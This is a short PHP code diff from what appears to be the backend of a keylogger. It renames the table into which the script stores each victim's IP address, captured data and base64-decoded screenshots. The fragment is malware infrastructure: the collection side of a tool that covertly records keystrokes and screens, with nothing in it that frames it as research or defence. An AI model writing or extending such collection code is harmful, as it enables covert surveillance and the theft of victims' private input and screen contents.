@@ -25,7 +25,7 @@ try {
 		
 		$blobImage = base64_decode($input);
 		
-		$stmt = $dbh->prepare("INSERT INTO Keylogger_table (ip, dat, screenshot) VALUES (:ip, :dat, :screenshot)");
+		$stmt = $dbh->prepare("INSERT INTO keylogger (ip, dat, screenshot) VALUES (:ip, :dat, :screenshot)");
 		$stmt->bindParam(':ip', $ip);
 		$stmt->bindParam(':dat', $dat);
 		$stmt->bindParam(':screenshot', $blobImage);
